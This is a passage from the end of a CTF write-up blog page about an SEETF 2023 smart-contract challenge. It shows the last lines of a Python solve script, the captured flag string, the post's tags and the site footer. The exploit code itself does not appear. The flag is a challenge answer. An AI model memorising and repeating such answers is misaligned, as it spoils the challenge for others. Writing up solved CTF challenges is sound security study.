</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;player balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">get_flag</span><span class="p">(</span><span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Flag: SEE{D14m0nd5_st0rAg3_4nd_P1g30nS_d0n&rsquo;t_g0_w311_t0G37h3r_B1lnG_bl1ng_bed2cbc16cbfca78f6e7d73ae2ac987f}</strong></p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/seetf-2023/" data-title="SEETF 2023" data-via="Chovid99" data-hashtags="Writeup,SEETF,smart-contract,reentrancy,diamond,facet,2023"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/seetf-2023/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/seetf/">SEETF</a>,&nbsp;<a href="/tags/smart-contract/">smart-contract</a>,&nbsp;<a href="/tags/reentrancy/">reentrancy</a>,&nbsp;<a href="/tags/diamond/">diamond</a>,&nbsp;<a href="/tags/facet/">facet</a>,&nbsp;<a href="/tags/2023/">2023</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/wanictf-2023/" class="prev" rel="prev" title="WaniCTF 2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>WaniCTF 2023</a>
            <a href="/posts/corctf-2023/" class="next" rel="next" title="corCTF 2023">corCTF 2023<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
